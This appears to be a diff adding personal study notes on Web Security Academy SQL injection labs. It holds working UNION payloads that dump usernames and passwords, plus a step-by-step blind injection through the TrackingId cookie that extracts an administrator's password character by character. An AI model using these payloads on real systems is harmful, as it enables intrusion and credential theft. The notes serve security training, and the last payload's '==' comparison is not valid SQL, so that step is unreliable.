@@ -885,5 +885,47 @@ SQL injection UNION attack, retrieving multiple values in a single column
 https://0afa006f04c947e48044c24a008600e5.web-security-academy.net/filter?category=Lifestyle' UNION SELECT NULL,'abcd',
 https://0afa006f04c947e48044c24a008600e5.web-security-academy.net/filter?category=Lifestyle' UNION SELECT NULL,username ||'-'|| password from users--
 __________________________________________________________________________________________________________________________________________________________________
+Blind SQL injection with conditional responses
+----------------------------------------------
+GET / HTTP/2
+Host: 0aa500e70324393880b8269900ac0011.web-security-academy.net
+Cookie: TrackingId=Yj1QBxHBb3Ixg5Au; session=ctNiFHULNnvSmDZBeW5a3B6PPxBmLjAR
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+
+Inject in Cookie: TrackingId
+
+In Original --> the website displays Welcome back!
+When you inject ---> TrackingId=Yj1QBxHBb3Ixg5Au' --> the website doesn't display Welcome back! --> it can have blind SQL injection
+
+
+Verify that the "Welcome back" message appears in the response --> TrackingId=xyz' AND 1=1 --> it is true --> Welcome back! appears
+
+Verify that the "Welcome back" message appears in the response --> TrackingId=xyz' AND 1=2 --> it is false --> Welcome back! doesn't appear
+
+Verify that the condition is true, confirming that there is a table called users --> TrackingId=xyz' AND (SELECT 'a' from users LIMIT 1) = 'a'--
+
+Verify that the condition is true, confirming that there is a user called administrator --> TrackingId=xyz' AND (SELECT 'a' from users WHERE username='administrator') = 'a'--
+
+This condition should be true, confirming that the password is greater than 1 character in length -->
+TrackingId=xyz' AND (SELECT 'a' from users WHERE username='administrator' AND length(password)>1)='a'-- 
+
+After determining the length of the password, the next step is to test the character at each position to determine its value --> 
+TrackingId=xyz' AND (Select SUBSTRING(password,1,1) from users WHERE username='administrator')=='a'
+
+You need to use burpsuite intruder --> cluster bomb --> TrackingId=xyz' AND (Select SUBSTRING(password,&1&,1) from users WHERE username='administrator')=='&a&'
+
+
+
+
+
+
+
+
+
+
+
+__________________________________________________________________________________________________________________________________________________________________
 
  
